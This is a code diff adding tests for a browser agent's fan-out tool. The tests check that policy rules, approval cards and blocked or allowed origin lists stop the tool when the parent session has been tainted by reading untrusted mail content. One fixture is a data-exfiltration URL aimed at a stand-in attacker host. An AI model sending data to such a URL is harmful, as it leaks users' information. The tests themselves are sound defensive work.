@@ -2,6 +2,8 @@
 import { describe, expect, it, vi } from 'vitest'
 import { FLEET_ACTION_TOOLS as BRIDGE_ACTIONS, FLEET_READ_TOOLS as BRIDGE_READS } from '@natgurlain/dsh-bridge-browser/src/fanout.ts'
 import { FLEET_ACTION_TOOLS, FLEET_READ_TOOLS, fleetApprovalPrompt, FleetRegistry, parseFleetRequest, type FleetDeps } from '../src/background/fleet.ts'
+import { resolveApprovalGate } from '../src/background/authorization.ts'
+import { evaluateCallPolicy } from '../src/security/call-policy.ts'
 
 const args = {
   tasks: [
@@ -95,5 +97,52 @@ describe('FleetRegistry', () => {
     expect(await registry.open({ id: 'x', name: 'browser_fanout', args, sessionId: 'parent' }, broken.deps)).toMatchObject({ ok: false, error: { message: expect.stringMatching(/boom/) } })
     expect(broken.closed).toEqual([7])
     expect(registry.refusal({ name: 'browser_click', sessionId: 'c1' })).toBeUndefined()
+  })
+})
+
+describe('fleet policy (review finding: browser_fanout skipped the policy layer)', () => {
+  const site = (user: { pattern: string; rule: 'blocked' | 'ask' | 'trusted' | 'read-only' }[]) => ({ managed: [], user, defaultsEnabled: false, enforceDefaults: false, defaultTrusted: true })
+  const exfil = 'https://attacker.example/c?d=' + 'A'.repeat(200)
+  const request = { tasks: [{ url: exfil, instruction: 'read' }], children: ['c1'], allowActions: false }
+
+  it('a tainted parent under unrestricted access still gets a forced card naming the URL risk', async () => {
+    const taint = { sources: ['https://mail.example'], firstTool: 'browser_snapshot', since: 0 }
+    const shown: unknown[] = []
+    const d = deps({
+      policy: (call, targets) => evaluateCallPolicy({ name: call.name, args: call.args, targets, site: site([]), taint }),
+      authorize: vi.fn(async (prompt) => {
+        shown.push(prompt)
+        const gate = resolveApprovalGate({ prompt, devToolsAllowed: false, devToolsSessionGrant: false, unrestrictedAccess: true, coveredByTrustedOrigins: false })
+        return gate === 'prompt' ? 'denied' as const : gate
+      }),
+    })
+    const answer = await new FleetRegistry().open({ id: '1', name: 'browser_fanout', args: request, sessionId: 'tainted-parent' }, d.deps)
+    expect(answer).toMatchObject({ ok: false })
+    expect(d.deps.createTab).not.toHaveBeenCalled()
+    expect(shown[0]).toMatchObject({ forced: true, urlRisk: true, canTrust: false })
+    const why = (shown[0] as { details: { label?: string; value?: string }[] }).details[0]!
+    expect(why.label).toMatch(/Why/)
+    expect(why.value).toMatch(/^Page 1: /)
+  })
+
+  it('a blocked site refuses the whole fleet without a card or a tab', async () => {
+    const d = deps({ policy: (call, targets) => evaluateCallPolicy({ name: call.name, args: call.args, targets, site: site([{ pattern: 'attacker.example', rule: 'blocked' }]) }) })
+    const answer = await new FleetRegistry().open({ id: '1', name: 'browser_fanout', args: { ...request, tasks: [{ url: 'https://ok.example/', instruction: 'x' }, ...request.tasks], children: ['c1', 'c2'] }, sessionId: 'p' }, d.deps)
+    expect(answer).toMatchObject({ ok: false, error: { message: expect.stringMatching(/^Page 2/) } })
+    expect(d.deps.authorize).not.toHaveBeenCalled()
+    expect(d.deps.createTab).not.toHaveBeenCalled()
+  })
+
+  it('managed allowedOrigins deny URLs outside the list', async () => {
+    const d = deps({ policy: (call, targets) => evaluateCallPolicy({ name: call.name, args: call.args, targets, site: site([]), managed: { disableScreenshots: false, disableDevTools: false, allowedOrigins: ['https://a.example'] } }) })
+    expect(await new FleetRegistry().open({ id: '1', name: 'browser_fanout', args, sessionId: 'p' }, d.deps)).toMatchObject({ ok: false, error: { message: expect.stringMatching(/administrator/) } })
+    expect(d.deps.createTab).not.toHaveBeenCalled()
+  })
+
+  it('a risky URL alone marks urlRisk so trusted origins cannot skip the card', () => {
+    const parsed = parseFleetRequest(request)
+    if (typeof parsed === 'string') throw new Error(parsed)
+    expect(fleetApprovalPrompt(parsed)).toMatchObject({ urlRisk: true })
+    expect(fleetApprovalPrompt(parsed).forced).toBeUndefined()
   })
 })
